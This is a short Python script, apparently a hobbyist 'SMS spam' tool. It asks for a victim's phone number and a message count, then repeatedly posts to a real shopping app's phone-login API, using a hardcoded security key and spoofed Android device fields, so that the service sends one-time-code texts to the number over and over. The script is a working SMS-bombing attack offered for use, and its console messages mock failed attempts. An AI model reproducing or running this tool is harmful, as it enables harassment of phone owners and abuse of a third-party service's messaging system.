import requests
import pyfiglet

red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'

ascii_art = pyfiglet.figlet_format("El Jo Net")
j = pyfiglet.figlet_format("Spam sms ")
print(green_color + ascii_art)
print(red_color+j)
print(light_blue_color + "by code: Jo_Ali")
print(blue_color + "By code: Yousef Jo")
print("")
nu = input(green_color + "Enter a number : " + light_blue_color)
print("")

m = int(input(green_color + "Enter a Number of messages  : " + light_blue_color))
sent_count = 0

for _ in range(m):
    url3 ="https://new-app.waffarha.com/api/loginByPhone"

    headers3 = {
        "accept": "application/json",
        "accept-language": "ar",
        "accept-encoding": "gzip",
        "content-length": "220",
        "host": "new-app.waffarha.com",
        "content-type": "application/json",
        "end_point": "loginByPhone",
    }

    data3 ='{"security_key":"f51e1cff3051d79e8a15a59907af64b0","city":"3","limit":"5","phone":"%s","app_version":"7.8.31","platform":"Android","device_token":"47e20e59f77ede50","lang":"ar","brand":"LV1","store":"PlayStore"}'%(nu)

    r3 = requests.post(url3, headers=headers3, data=data3).text
    if '{"data":{"html_message":' in r3:
        sent_count += 1
        print("   ({} Done send message✅)".format(sent_count))
    elif '{"status":200}' in r3:
        print("لا يمكن عمل سبام للرقم ده 😂")
    else:
        print("الرقم غلط يسطااااااا❌")
        
